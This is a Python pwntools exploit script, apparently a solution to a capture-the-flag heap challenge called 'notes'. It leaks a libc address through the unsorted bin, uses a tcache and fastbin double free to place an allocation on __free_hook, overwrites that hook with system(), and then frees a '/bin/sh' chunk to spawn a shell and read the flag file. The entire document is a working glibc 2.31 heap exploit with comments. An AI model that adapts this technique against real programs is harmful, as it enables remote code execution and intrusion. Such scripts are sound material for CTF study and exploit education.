#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("./notes_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

rop = ROP(exe)

host, port = "notes.nc.jctf.pro", "5001"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

def add(size,data):
  p.sendlineafter('> ', '1')
  p.sendlineafter('size: ', str(size))
  p.sendafter('content: ', data)

def free(idx):
  p.sendlineafter('> ', '2')
  p.sendlineafter('id: ', str(idx))

def view(idx):
  p.sendlineafter('> ', '3')
  p.sendlineafter('id: ', str(idx))

p.sendlineafter('(0-10): ', '-10')


# alloc 9 chunks 0x100 size in tcache
for i in range(9):
  add(0xf8,chr(0x41+i))

# free 8 of them, to make last goes in unsorted
for i in range(8):
  free(i)

# leak unsorted main_arena address
view(7)
leak = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
print('leak = '+hex(leak))
# calculate libc base
libc.address = leak - 0x1ecbe0
print('libc base = '+hex(libc.address))

# string of command to be executed at the end
add(0xf8,'/bin/sh\x00')

# now we do a fastbin dup attack
# alloc 10 x 0x20 size tcache 
for i in range(10):
  add(0x18,chr(0x41+i))

# free 7 of them to fill tcache line of size 0x20
for i in range(7):
  free(i+10)

# double free one chunk in fastbin
free(17)
free(18)
free(17)

# now empty the 0x20 tcache line
for i in range(7):
  add(0x18,'A')

#Â do the fastbin dup attack, to get an allocation on __free_hook
add(0x18,p64(libc.sym['__free_hook']))
add(0x18,'B')
add(0x18,'C')
# overwrite __free_hook with system() address
add(0x18,p64(libc.sym['system']))

# execute out command
free(9)

p.sendline('cat /pwn/flag.txt')
p.interactive()

